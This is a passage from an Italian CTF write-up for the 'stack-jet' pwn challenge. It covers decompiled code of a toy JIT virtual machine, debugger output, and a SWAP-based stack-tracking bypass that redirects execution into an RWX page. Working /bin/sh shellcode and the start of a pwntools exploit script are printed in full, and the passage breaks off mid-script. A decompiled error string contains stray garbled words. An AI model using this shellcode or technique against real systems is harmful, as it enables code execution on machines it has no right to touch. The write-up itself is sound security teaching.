---
layout: cyber-post
title: "Stack-Jey"
description: "Simil-sandbox escape CTF."
date: 2025-10-19
categories: [WriteUps, Stack]
image: /images/1.png
---

PWN CTF challenge write up.

---

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BL2501MC35"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BL2501MC35');
</script>

<!-- Star Repository Alert -->
<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">‚≠ê</span>
    <span class="star-text">Ti piace il sito?</span>
    <br>
    <span class="star-text">Lascia una stella su GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      ‚≠ê Stella
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div id="like-system" style="text-align: center; padding: 15px; border: none; border-radius: 10px;">
  <button id="like-btn" style="background: none; border: none; font-size: 2em; cursor: pointer; transition: all 0.3s ease;">
    <span id="flame-icon">üî•</span>
  </button>
  <div id="like-count" style="margin-top: 10px; font-weight: bold; color: #fff;">
    <span id="count-number">...</span> fiamme
  </div>
</div>

<script>
(function() {
  // 1. INCOLLA L'URL DELLA TUA APP WEB GOOGLE SCRIPT QUI
  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyYd3_qVOVqavsac-rwCo6yKUdw7pRpEqkeckLA6NJ_iLWThE4APR1ejaW4wYFu1qo95g/exec';
  
  // Usiamo un ID per questo post, puoi cambiarlo per altre pagine
  const POST_ID = 'mio-primo-post'; 
  const LIKED_KEY = `nas-post-liked-${POST_ID}`;
  
  const likeBtn = document.getElementById('like-btn');
  const flameIcon = document.getElementById('flame-icon');
  const countNumber = document.getElementById('count-number');
  
  // Stato locale dell'utente
  let hasLiked = localStorage.getItem(LIKED_KEY) === 'true';
  // Stato globale (caricato dallo script)
  let globalLikes = 0;
  
  function updateUI() {
    countNumber.textContent = globalLikes;
    
    if (hasLiked) {
      flameIcon.style.transform = 'scale(1.3)';
      flameIcon.style.filter = 'drop-shadow(0 0 8px orange)';
      likeBtn.style.background = '#ff6b35'; 
      likeBtn.style.borderRadius = '50%';
      likeBtn.style.padding = '10px';
    } else {
      flameIcon.style.transform = 'scale(1)';
      flameIcon.style.filter = 'grayscale(50%)';
      likeBtn.style.background = 'none';
      likeBtn.style.padding = '5px';
    }
  }
  
  // Funzione per chiamare il nostro Google Script
  async function callLikeScript(action) {
    // Aggiungiamo '?' e l'azione, e un parametro 't' per evitare la cache
    const url = `${SCRIPT_URL}?action=${action}&t=${new Date().getTime()}`;
    
    try {
      const response = await fetch(url);
      if (!response.ok) { throw new Error('Errore di rete'); }
      
      const data = await response.json();
      globalLikes = data.count; // Aggiorna il conteggio globale
      updateUI(); // Aggiorna la UI con il nuovo numero
      
    } catch (error) {
      console.error('Errore nel chiamare lo script:', error);
      // Anche se c'√® un errore, aggiorniamo la UI locale
      updateUI();
    }
  }

  function toggleLike() {
    // Disabilita il pulsante per evitare click doppi
    likeBtn.disabled = true; 
    
    let action = '';
    
    if (hasLiked) {
      // Rimuovi like
      hasLiked = false;
      action = 'remove';
      flameIcon.style.animation = 'shake 0.5s ease-in-out';
    } else {
      // Aggiungi like
      hasLiked = true;
      action = 'add';
      flameIcon.style.animation = 'bounce 0.6s ease-in-out';
      createFireParticles();
    }
    
    // Salva stato locale
    localStorage.setItem(LIKED_KEY, hasLiked.toString());
    
    // Chiama lo script per aggiornare il conteggio globale
    // e riabilita il pulsante dopo che ha finito
    callLikeScript(action).finally(() => {
      likeBtn.disabled = false;
    });
    
    // Reset animazione
    setTimeout(() => {
      flameIcon.style.animation = '';
    }, 600);
  }
  
  // Carica il conteggio iniziale all'avvio della pagina
  function loadInitialCount() {
    callLikeScript('get'); // 'get' prende solo il valore senza modificarlo
  }
  
  // Funzione createFireParticles
  function createFireParticles() {
    const rect = likeBtn.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;
    for (let i = 0; i < 6; i++) {
      const particle = document.createElement('div');
      particle.textContent = ['üî•', '‚ú®', 'üí•'][Math.floor(Math.random() * 3)];
      particle.style.position = 'fixed';
      particle.style.left = centerX + 'px';
      particle.style.top = centerY + 'px';
      particle.style.fontSize = '1em';
      particle.style.pointerEvents = 'none';
      particle.style.zIndex = '9999';
      particle.style.animation = `particle-${i} 1s ease-out forwards`;
      document.body.appendChild(particle);
      setTimeout(() => particle.remove(), 1000);
    }
  }
  
  // Event listener
  likeBtn.addEventListener('click', toggleLike);
  
  // CSS animazioni (COMPLETATO)
  const style = document.createElement('style');
  style.textContent = `
    @keyframes bounce {
      0% { transform: scale(1); }
      50% { transform: scale(1.5); }
      100% { transform: scale(1.3); }
    }
    
    @keyframes shake {
      0%, 100% { transform: translateX(0) scale(1.3); }
      25% { transform: translateX(-5px) scale(1.1); }
      75% { transform: translateX(5px) scale(1.1); }
    }
    
    @keyframes particle-0 {
      to { transform: translate(-30px, -30px); opacity: 0; }
    }
    @keyframes particle-1 {
      to { transform: translate(30px, -30px); opacity: 0; }
    }
    @keyframes particle-2 {
      to { transform: translate(-20px, -40px); opacity: 0; }
    }
    @keyframes particle-3 {
      to { transform: translate(20px, -40px); opacity: 0; }
    }
    @keyframes particle-4 {
      to { transform: translate(0px, -50px); opacity: 0; }
    }
    @keyframes particle-5 {
      to { transform: translate(-10px, -35px); opacity: 0; }
    }
    
    #like-btn:hover {
      transform: scale(1.1);
    }
  `;
  document.head.appendChild(style);
  
  // Avvia tutto caricando il conteggio iniziale
  loadInitialCount();
})();
</script>

---

# Stack-Jet

## Il programma

### Il codice
La challenge stack-jet presentava una specie di sandbox escape:
- una stack-based virtual machine (una mini-VM con poche istruzioni),
- un JIT compiler molto basilare che traduceva le istruzioni della VM in bytecode x86-64,
- un meccanismo di esecuzione finale del codice JIT-compilato.

L‚Äôaspetto centrale era capire il comportamento del JIT e come manipolarlo, ecco il codice disassemblato da un famoso disassembler:
```c
/* This file was generated by the Hex-Rays decompiler version 9.0.0.240807.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 (**init_proc())(void);
void sub_1020();
// int __cxa_finalize(void *);
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void));
void *deregister_tm_clones();
__int64 register_tm_clones(void); // weak
void *_do_global_dtors_aux();
__int64 frame_dummy();
int __fastcall main(int argc, const char **argv, const char **envp);
void _libc_csu_fini(void); // idb
void term_proc();
// int _libc_start_main(int (*main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// int _cxa_finalize(void *);
// __int64 _gmon_start__(void); weak

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN _libc_csu_init;
_UNKNOWN *_dso_handle = &_dso_handle; // weak
_UNKNOWN _TMC_END__; // weak
char completed_7387; // weak


//----- (0000000000001000) ----------------------------------------------------
__int64 (**init_proc())(void)
{
  __int64 (**result)(void); // rax

  result = &_gmon_start__;
  if ( &_gmon_start__ )
    return (__int64 (**)(void))_gmon_start__();
  return result;
}
// 40E8: using guessed type __int64 _gmon_start__(void);

//----- (0000000000001020) ----------------------------------------------------
void sub_1020()
{
  JUMPOUT(0LL);
}
// 1026: control flows out of bounds to 0

//----- (0000000000001110) ----------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  char *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  _libc_start_main(
    (int (*)(int, char **, char **))main,
    v4,
    &retaddr,
    (void (*)(void))_libc_csu_init,
    _libc_csu_fini,
    a3,
    &v5);
  __halt();
}
// 111A: positive sp value 8 has been found
// 1121: variable 'v3' is possibly undefined

//----- (0000000000001140) ----------------------------------------------------
void *deregister_tm_clones()
{
  return &_TMC_END__;
}

//----- (0000000000001170) ----------------------------------------------------
__int64 register_tm_clones()
{
  return 0LL;
}
// 1170: using guessed type __int64 register_tm_clones();

//----- (00000000000011B0) ----------------------------------------------------
void *_do_global_dtors_aux()
{
  void *result; // rax

  if ( !completed_7387 )
  {
    if ( &_cxa_finalize )
      __cxa_finalize(&_dso_handle);
    result = deregister_tm_clones();
    completed_7387 = 1;
  }
  return result;
}
// 3D58: using guessed type _UNKNOWN *_dso_handle;
// 4048: using guessed type char completed_7387;

//----- (00000000000011F0) ----------------------------------------------------
__int64 frame_dummy()
{
  return register_tm_clones();
}
// 1170: using guessed type __int64 register_tm_clones(void);

//----- (00000000000011F9) ----------------------------------------------------
void __fastcall check_stack(unsigned __int64 a1)
{
  if ( a1 > 0x1FE )
  {
    fwrite("Error: stack overflow\n", 1uLL, 0x16uLL, stderr);
    exit(1);
  }
}

//----- (000000000000123C) ----------------------------------------------------
unsigned __int64 __fastcall track_stack(unsigned __int64 current_depth, unsigned __int64 needed, __int64 produced)
{
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  if ( current_depth < needed )
  {
    fwrite("Error: not enough di che era tipo una sandbox escapevalues on stack\n", 1uLL, 0x22uLL, stderr);
    exit(1);
  }
  v4 = current_depth - needed + produced;
  check_stack(v4);
  return v4;
}

//----- (00000000000012AC) ----------------------------------------------------
char *__fastcall emit(char *a1, const void *a2, size_t a3)
{
  if ( &a1[a3] > (char *)g_jit_code + 4096 )
  {
    fwrite("Error: code too big\n", 1uLL, 0x14uLL, stderr);
    exit(1);
  }
  memcpy(a1, a2, a3);
  return &a1[a3];
}
// 4050: using guessed type __int64 (*g_jit_code)(void);

//----- (000000000000132B) ----------------------------------------------------
char *jit_init()
{
  char *result; // rax
  char *g_jit_code; // [rsp+8h] [rbp-8h]

  ::g_jit_code = (__int64 (*)(void))mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( ::g_jit_code == (__int64 (*)(void))-1LL )
  {
    perror("mmap");
    exit(1);
  }
  g_jit_code = (char *)mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
  if ( g_jit_code == (char *)-1LL )
  {
    perror("mmap");
    exit(1);
  }
  result = g_jit_code + 4096;
  g_jit_stack_top = (__int64)(g_jit_code + 4096);
  return result;
}
// 4050: using guessed type __int64 (*g_jit_code)(void);
// 4058: using guessed type __int64 g_jit_stack_top;

//----- (00000000000013DC) ----------------------------------------------------
unsigned __int64 __fastcall jit_compile(unsigned __int64 *num_args)
{
  unsigned __int8 *v1; // rax
  unsigned __int64 *v3; // [rsp+20h] [rbp-50h]
  char *v4; // [rsp+28h] [rbp-48h]
  char *v5; // [rsp+28h] [rbp-48h]
  unsigned __int64 stack_depth; // [rsp+30h] [rbp-40h]
  unsigned __int64 *v7; // [rsp+38h] [rbp-38h]
  _BYTE buf[13]; // [rsp+40h] [rbp-30h] BYREF
  char v9; // [rsp+4Dh] [rbp-23h]
  char v10; // [rsp+4Eh] [rbp-22h]
  char v11; // [rsp+4Fh] [rbp-21h]
  char v12; // [rsp+50h] [rbp-20h]
  char v13; // [rsp+51h] [rbp-1Fh]
  char v14; // [rsp+52h] [rbp-1Eh]
  char v15; // [rsp+53h] [rbp-1Dh]
  char v16; // [rsp+54h] [rbp-1Ch]
  char v17; // [rsp+55h] [rbp-1Bh]
  char v18; // [rsp+56h] [rbp-1Ah]
  char v19; // [rsp+57h] [rbp-19h]
  int v20; // [rsp+58h] [rbp-18h]
  unsigned __int64 canary; // [rsp+68h] [rbp-8h]

  canary = __readfsqword(0x28u);
  if ( *num_args > 10 )
  {
    fwrite("Error: too many arguments\n", 1uLL, 0x1AuLL, stderr);
    exit(1);
  }
  v3 = num_args + 2;
  v7 = (unsigned __int64 *)((char *)num_args + num_args[1] + 16);
  v4 = (char *)g_jit_code;
  stack_depth = *num_args;
  check_stack(*num_args);
  buf[0] = 72;
  buf[1] = -119;
  buf[2] = -32;
  buf[3] = 72;
  buf[4] = -68;
  *(_QWORD *)&buf[5] = g_jit_stack_top;
  v9 = 80;
  v10 = -24;
  v11 = 2;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 92;
  v16 = -61;
  v17 = 72;
  v18 = -127;
  v19 = -20;
  v20 = 8 * *num_args;
  v5 = emit(v4, buf, 0x1CuLL);
  while ( v3 < v7 )
  {
    v1 = (unsigned __int8 *)v3;
    v3 = (unsigned __int64 *)((char *)v3 + 1);
    switch ( *v1 )
    {
      case 0u:
        if ( v7 < v3 + 1 )
        {
          fwrite("Error: missing push operand\n", 1uLL, 0x1CuLL, stderr);
          exit(1);
        }
        stack_depth = track_stack(stack_depth, 0LL, 1LL);
        buf[0] = 72;
        buf[1] = -72;
        *(_QWORD *)&buf[2] = *v3++;
        buf[10] = 80;
        v5 = emit(v5, buf, 11uLL);
        break;
      case 1u:
        stack_depth = track_stack(stack_depth, 1uLL, 0LL);
        buf[0] = 88;
        v5 = emit(v5, buf, 1uLL);
        break;
      case 2u:
        stack_depth = track_stack(stack_depth, 1uLL, 2LL);
        buf[0] = 72;
        buf[1] = -117;
        buf[2] = 4;
        qmemcpy(&buf[3], "$P", 2);
        v5 = emit(v5, buf, 5uLL);
        break;
      case 3u:
        qmemcpy(buf, "X_PW", 4);
        v5 = emit(v5, buf, 4uLL);
        break;
      case 4u:
        stack_depth = track_stack(stack_depth, 2uLL, 1LL);
        qmemcpy(buf, "XH", 2);
        buf[2] = 1;
        buf[3] = 4;
        buf[4] = 36;
        v5 = emit(v5, buf, 5uLL);
        break;
      case 5u:
        stack_depth = track_stack(stack_depth, 2uLL, 1LL);
        qmemcpy(buf, "XH)", 3);
        buf[3] = 4;
        buf[4] = 36;
        v5 = emit(v5, buf, 5uLL);
        break;
      default:
        fprintf(stderr, "Error: unknown opcode 0x%02x\n", *v1);
        exit(1);
    }
  }
  if ( stack_depth != 1 )
  {
    fwrite("Error: must have a single return value on stack\n", 1uLL, 0x30uLL, stderr);
    exit(1);
  }
  buf[0] = 88;
  buf[1] = -61;
  emit(v5, buf, 2uLL);
  return __readfsqword(0x28u) ^ canary;
}
// 4050: using guessed type __int64 (*g_jit_code)(void);
// 4058: using guessed type __int64 g_jit_stack_top;

//----- (00000000000017C9) ----------------------------------------------------
__int64 __fastcall jit_set_arg(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = a2;
  *(_QWORD *)(g_jit_stack_top - 16 + -8 - 8 * a1) = a2;
  return result;
}
// 4058: using guessed type __int64 g_jit_stack_top;

//----- (0000000000001807) ----------------------------------------------------
__int64 jit_run()
{
  return g_jit_code();
}
// 4050: using guessed type __int64 (*g_jit_code)(void);

//----- (0000000000001816) ----------------------------------------------------
int disable_buffering()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  return setvbuf(stdout, 0LL, 2, 0LL);
}

//----- (0000000000001859) ----------------------------------------------------
unsigned __int64 __fastcall read_exactly(int a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+20h] [rbp-10h]
  ssize_t v6; // [rsp+28h] [rbp-8h]

  for ( i = 0LL; ; i += v6 )
  {
    result = i;
    if ( i >= a3 )
      break;
    v6 = read(a1, (void *)(i + a2), a3 - i);
    if ( v6 == -1 )
    {
      perror("read");
      exit(1);
    }
    if ( !v6 )
    {
      fwrite("Error: unexpected EOF\n", 1uLL, 0x16uLL, stderr);
      exit(1);
    }
  }
  return result;
}

//----- (0000000000001905) ----------------------------------------------------
unsigned __int64 read_ul()
{
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  if ( !fgets(buf, 32, stdin) )
  {
    perror("fgets");
    exit(1);
  }
  return strtoul(buf, 0LL, 0);
}

//----- (000000000000197B) ----------------------------------------------------
unsigned __int64 run_program()
{
  size_t i; // [rsp+0h] [rbp-420h]
  __int64 result; // [rsp+10h] [rbp-410h]
  unsigned __int64 arg_value; // [rsp+18h] [rbp-408h]
  size_t num_args; // [rsp+20h] [rbp-400h] BYREF
  unsigned __int64 code_size; // [rsp+28h] [rbp-3F8h]
  __int64 program_bytecode; // [rsp+30h] [rbp-3F0h] BYREF
  unsigned __int64 canary; // [rsp+418h] [rbp-8h]

  canary = __readfsqword(0x28u);
  printf("Number of arguments: ");
  num_args = read_ul();
  printf("%zu\n", num_args);
  printf("Code size: ");
  code_size = read_ul();
  if ( code_size > 1000 )
  {
    fwrite("Error: program too big\n", 1uLL, 0x17uLL, stderr);
    exit(1);
  }
  read_exactly(0, (__int64)&program_bytecode, code_size);
  jit_compile((__int64 *)&num_args);
  puts("[+] Compilation succeeded");
  for ( i = 0LL; i < num_args; ++i )
  {
    printf("Argument %zu: ", i);
    arg_value = read_ul();
    jit_set_arg(i, arg_value);
  }
  result = jit_run();
  printf("[+] Result: %lu\n", result);
  return __readfsqword(0x28u) ^ canary;
}
// 13DC: using guessed type __int64 __fastcall jit_compile(_QWORD);
// 17C9: using guessed type __int64 __fastcall jit_set_arg(_QWORD, _QWORD);
// 1807: using guessed type __int64 jit_run(void);
// 1859: using guessed type __int64 __fastcall read_exactly(_QWORD, _QWORD, _QWORD);

//----- (0000000000001B35) ----------------------------------------------------
int __fastcall main(int argc, const char **argv, const char **envp)
{
  disable_buffering(argc, argv, envp);
  jit_init();
  run_program();
  return 0;
}
// 1816: using guessed type __int64 __fastcall disable_buffering(_QWORD, _QWORD, _QWORD);

//----- (0000000000001B50) ----------------------------------------------------
void __fastcall _libc_csu_init(unsigned int a1, __int64 a2, __int64 a3)
{
  signed __int64 v4; // rbp
  __int64 i; // rbx

  init_proc();
  v4 = &_do_global_dtors_aux_fini_array_entry - _frame_dummy_init_array_entry;
  if ( v4 )
  {
    for ( i = 0LL; i != v4; ++i )
      ((void (__fastcall *)(_QWORD, __int64, __int64))_frame_dummy_init_array_entry[i])(a1, a2, a3);
  }
}
// 1000: using guessed type __int64 init_proc(void);
// 11F0: using guessed type __int64 __fastcall frame_dummy(_QWORD, _QWORD, _QWORD);
// 3D48: using guessed type __int64 (__fastcall *_frame_dummy_init_array_entry[2])();
// 3D50: using guessed type __int64 (__fastcall *_do_global_dtors_aux_fini_array_entry)();

//----- (0000000000001BC0) ----------------------------------------------------
void _libc_csu_fini(void)
{
  ;
}

//----- (0000000000001BC8) ----------------------------------------------------
void term_proc()
{
  ;
}

// nfuncs=52 queued=22 decompiled=22 lumina nreq=0 worse=0 better=0
// ALL OK, 22 function(s) have been successfully decompiled

```

Operazioni possibili:
* **`OP_PUSH` (`\x00`)**: Prende un valore come argomento (nel tuo script, un `p64`) e lo "spinge" (push) in cima allo stack della VM.
* **`OP_POP` (`\x01`)**: "Estrae" (pop) il valore in cima allo stack, scartandolo.
* **`OP_DUP` (`\x02`)**: Duplica il valore in cima allo stack. (Es. se lo stack √® `[A]`, diventa `[A, A]`).
* **`OP_SWAP` (`\x03`)**: Scambia di posto i due valori in cima allo stack. (Es. se lo stack √® `[A, B]`, diventa `[B, A]`).
* **`OP_ADD` (`\x04`)**: Estrae gli ultimi due valori dallo stack, li somma e spinge il risultato di nuovo sullo stack. (Es. `[A, B]` diventa `[A+B]`).
* **`OP_SUB` (`\x05`)**: Estrae gli ultimi due valori dallo stack, li sottrae (il secondo meno il primo) e spinge il risultato sullo stack. (Es. `[A, B]` diventa `[A-B]`).

### Le sicurezze
```zsh
~/Downloads ‚ùØ checksec stack-jet                      
[*] '/home/chris/Downloads/stack-jet'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```
Il programma presenta tutte le sicurezze del caso.

## L'exploit
Analizzando il codice disassemblato, in particolare la funzione jit_compile, possiamo identificare la strategia d'attacco. Il programma JIT-compila il nostro bytecode VM in codice x86-64 nativo, che viene poi scritto in una pagina di memoria mappata con permessi PROT_READ | PROT_WRITE | PROT_EXEC (RWX). Questo √® il nostro obiettivo primario: se riusciamo a scrivere il nostro shellcode in questa pagina e a trasferirci l'esecuzione, possiamo aggirare NX e abbiamo vinto.

### Il primo passo: Dirottare il rip in modo personalizzato.
Mettendo come breakpoint l'indirizzo della zona di memoria mappata dal programma sono riuscito a scoprire che come primo valore nello stack abbiamo un indirizzo proprio della zona interessata, il che risulta utile.

```zsh
pwndbg> x/xg $rsp
0x7f3df0633ff0: 0x00007f3df0634013
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
    0x55d493f45000     0x55d493f46000 r--p     1000       0 stack-jet
    0x55d493f46000     0x55d493f47000 r-xp     1000    1000 stack-jet
    0x55d493f47000     0x55d493f48000 r--p     1000    2000 stack-jet
    0x55d493f48000     0x55d493f49000 r--p     1000    2000 stack-jet
    0x55d493f49000     0x55d493f4a000 rw-p     1000    3000 stack-jet
    0x7f3df0200000     0x7f3df0224000 r--p    24000       0 /usr/lib/libc.so.6
    0x7f3df0224000     0x7f3df0396000 r-xp   172000   24000 /usr/lib/libc.so.6
    0x7f3df0396000     0x7f3df0405000 r--p    6f000  196000 /usr/lib/libc.so.6
    0x7f3df0405000     0x7f3df0409000 r--p     4000  204000 /usr/lib/libc.so.6
    0x7f3df0409000     0x7f3df040b000 rw-p     2000  208000 /usr/lib/libc.so.6
    0x7f3df040b000     0x7f3df0413000 rw-p     8000       0 [anon_7f3df040b]
    0x7f3df05fc000     0x7f3df0601000 rw-p     5000       0 [anon_7f3df05fc]
    0x7f3df0633000     0x7f3df0634000 rw-p     1000       0 [anon_7f3df0633]
    0x7f3df0634000     0x7f3df0635000 rwxp     1000       0 [anon_7f3df0634]
    0x7f3df0635000     0x7f3df0639000 r--p     4000       0 [vvar]
    0x7f3df0639000     0x7f3df063b000 r-xp     2000       0 [vdso]
    0x7f3df063b000     0x7f3df063c000 r--p     1000       0 /usr/lib/ld-linux-x86-64.so.2
    0x7f3df063c000     0x7f3df0666000 r-xp    2a000    1000 /usr/lib/ld-linux-x86-64.so.2
    0x7f3df0666000     0x7f3df0674000 r--p     e000   2b000 /usr/lib/ld-linux-x86-64.so.2
    0x7f3df0674000     0x7f3df0676000 r--p     2000   39000 /usr/lib/ld-linux-x86-64.so.2
    0x7f3df0676000     0x7f3df0677000 rw-p     1000   3b000 /usr/lib/ld-linux-x86-64.so.2
    0x7f3df0677000     0x7f3df0678000 rw-p     1000       0 [anon_7f3df0677]
    0x7fff07a9c000     0x7fff07abe000 rw-p    22000       0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000       0 [vsyscall]
```

Se provo a pushare un valore e ad eseguire ```ADD``` non riesco a farlo perch√® mi dice che non ho abbastanza valori sullo stack (ne abbiamo messo solo 1).

Inizio quindi a guardare la logica delle operazioni e vedo tra tutte una risulta particolarmente curiosa: la funzione ```SWAP```, poich√® ci permette di operare senza andare a chiamare ```track_stack()```.

Posso quindi pushare un valore a caso (io ho scelto 0) ed eseguire poi ```SWAP``` per fare risultare al programma l'indirzzo di RWX come il valore da me pushato.
```python
bytecode += OP_PUSH + p64(0)
bytecode += OP_SWAP
```

Ora ci rimane solo da pushare un OFFSET con cui fare ```ADD``` che troveremo quando sapremo cosa mandare dopo e dove arriva in memoria.
```python
bytecode += OP_PUSH + p64(OFFSET)
bytecode += OP_ADD
```

### Il secondo passo: Pushare in memoria lo shellcode 
Ora che possiamo ritornare dove vogliamo in RWX proviamo a pushare un valore a caso in memoria per vedere dove va a finire e scopriamo che finisce in ```0x...3d```, abbiamo quindi un offset di: 
> 0x3d-0x13=42

Ora dobbiamo solo pensare a cosa pushare, io ho optato per uno shellcode che ogni 8 byte ne salta 3 poich√® ci sono i byte delle operazioni tradotte dal compilatore del programma da evitare di eseguire, per farlo ho scelto un'implementazione che mi stampasse a schermo ogni 8 byte per semplificarmi la vita(nella push si devono mandare 8 byte):
```python
from pwn import *

sh = asm("""
    step0:
        xor rsi, rsi   /* 3 byte */
        xor rdx, rdx   /* 3 byte */
        jmp short step1 /* 2 byte */
    nop
    nop
    nop
         
    step1:
        xor rax, rax   /* 3 byte */
        jmp short step2 /* 2 byte */
    nop
    nop
    nop
    
    step2:
        push rax       /* 1 byte */
        nop
        nop
        jmp short step3  /* 2 byte */
    nop
    nop
    nop
         
    step3:
        mov al, 0x68   /* 2 byte */
        nop
        jmp short step4  /* 2 byte */
         
    nop
    nop
    nop
    
    step4:
        shl eax, 8      /* 3 byte */
        jmp short step5  /* 2 byte */
    nop
    nop
    nop
         
    step5:
        mov al, 0x73  /* 2 byte */
        nop
        jmp short step6  /* 2 byte */
    nop
    nop
    nop
    
    step6:
        shl eax, 8     /* 3 byte */
        jmp short step7  /* 2 byte */
    nop
    nop
    nop
         
    step7:
        mov al, 0x2f   /* 2 byte */
        push rax       /* 1 byte */
        jmp short step8 /* 2 byte */
    nop
    nop
    nop
         
    step8:
        mov cl, 8  /* 2 byte */
        nop
        jmp short step9 /* 2 byte */
    nop
    nop
    nop
         
    step9:
        shl rax, cl    /* 3 byte */
        jmp short step10 /* 2 byte */
    nop
    nop
    nop
         
    step10:
        mov al, 0x6e   /* 2 byte */
        nop
        jmp short step11 /* 2 byte */
    nop
    nop
    nop
         
    step11:
        shl rax, cl     /* 3 byte */
        jmp short step12 /* 2 byte */
    nop
    nop
    nop 
    
    step12:
        mov al, 0x69   /* 2 byte */
        nop
        jmp short step13 /* 2 byte */
    nop
    nop
    nop
         
    step13:
        shl rax, cl     /* 3 byte */
        jmp short step14 /* 2 byte */
    nop
    nop
    nop
         
    step14:
        mov al, 0x62   /* 2 byte */
        nop
        jmp short step15 /* 2 byte */
    nop
    nop
    nop
         
    step15:
        shl rax, cl     /* 3 byte */
        jmp short step16 /* 2 byte */
    nop
    nop
    nop
         
    step16:
        mov al, 0x2f   /* 2 byte */
        push rax       /* 1 byte */
        jmp short step17 /* 2 byte */
    nop
    nop
    nop
         
    step17:
        xor rax, rax   /* 3 byte */
        jmp short step18 /* 2 byte */
    nop
    nop
    nop
         
    step18:
        push rsp       /* 1 byte */
        pop rdi        /* 1 byte */
        nop
        jmp short step19 /* 2 byte */
    nop
    nop
    nop

    step19:
        mov al, 0x3b   /* 2 byte */
        nop
        jmp short step20  /* 2 byte */
    nop
    nop
    nop

    step20:
        syscall        /* 2 byte */
        ret            /* 1 byte */
    nop
    nop
""")
print(f"--- Shellcode ({len(sh)} bytes) ---")

for i in range(0, len(sh), 8):
    chunk = sh[i:i+8]
    
    hex_bytes = "".join("\\x"+f"{b:02x}" for b in chunk)
    
    print(hex_bytes.ljust(23))
```

Ecco il risultato:
```zsh
\x48\x31\xf6\x48\x31\xd2\xeb\x03
\x90\x90\x90\x48\x31\xc0\xeb\x03
\x90\x90\x90\x50\x90\x90\xeb\x03
\x90\x90\x90\xb0\x68\x90\xeb\x03
\x90\x90\x90\xc1\xe0\x08\xeb\x03
\x90\x90\x90\xb0\x73\x90\xeb\x03
\x90\x90\x90\xc1\xe0\x08\xeb\x03
\x90\x90\x90\xb0\x2f\x50\xeb\x03
\x90\x90\x90\xb1\x08\x90\xeb\x03
\x90\x90\x90\x48\xd3\xe0\xeb\x03
\x90\x90\x90\xb0\x6e\x90\xeb\x03
\x90\x90\x90\x48\xd3\xe0\xeb\x03
\x90\x90\x90\xb0\x69\x90\xeb\x03
\x90\x90\x90\x48\xd3\xe0\xeb\x03
\x90\x90\x90\xb0\x62\x90\xeb\x03
\x90\x90\x90\x48\xd3\xe0\xeb\x03
\x90\x90\x90\xb0\x2f\x50\xeb\x03
\x90\x90\x90\x48\x31\xc0\xeb\x03
\x90\x90\x90\x54\x5f\x90\xeb\x03
\x90\x90\x90\xb0\x3b\x90\xeb\x03
\x90\x90\x90\x0f\x05\xc3\x90\x90
```

Ora basta poi rimuovere dallo stack lo shellocode allocato in modo che venga salvato solo in RWX ed il gioco √® fatto, ecco l'exploit completo:
```python
from pwn import *

context.arch = 'amd64'

OP_PUSH = b"\x00"
OP_POP  = b"\x01"
OP_DUP  = b"\x02"
OP_SWAP = b"\x03"
OP_ADD  = b"\x04"
OP_SUB  = b"\x05"

SHELLCODE_BLOCCO = {}
SHELLCODE_BLOCCO[0] = b"\x48\x31\xf6\x48\x31\xd2\xeb\x03"
SHELLCODE_BLOCCO[1] = b"\x90\x90\x90\x48\x31\xc0\xeb\x03"
SHELLCODE_BLOCCO[2] = b"\x90\x90\x90\x50\x90\x90\xeb\x03"
SHELLCODE_BLOCCO[3] = b"\x90\x90\x90\xb0\x68\x90\xeb\x03"
SHELLCODE_BLOCCO[4] = b"\x90\x90\x90\xc1\xe0\x08\xeb\x03"
SHELLCODE_BLOCCO[5] = b"\x90\x90\x90\xb0\x73\x90\xeb\x03"
SHELLCODE_BLOCCO[6] = b"\x90\x90\x90\xc1\xe0\x08\xeb\x03"
SHELLCODE_BLOCCO[7] = b"\x90\x90\x90\xb0\x2f\x50\xeb\x03"
SHELLCODE_BLOCCO[8] = b"\x90\x90\x90\xb1\x08\x90\xeb\x03"
SHELLCODE_BLOCCO[9] = b"\x90\x90\x90\x48\xd3\xe0\xeb\x03"
SHELLCODE_BLOCCO[10] = b"\x90\x90\x90\xb0\x6e\x90\xeb\x03"
SHELLCODE_BLOCCO[11] = b"\x90\x90\x90\x48\xd3\xe0\xeb\x03"
SHELLCODE_BLOCCO[12] = b"\x90\x90\x90\xb0\x69\x90\xeb\x03"
SHELLCODE_BLOCCO[13] = b"\x90\x90\x90\x48\xd3\xe0\xeb\x03"
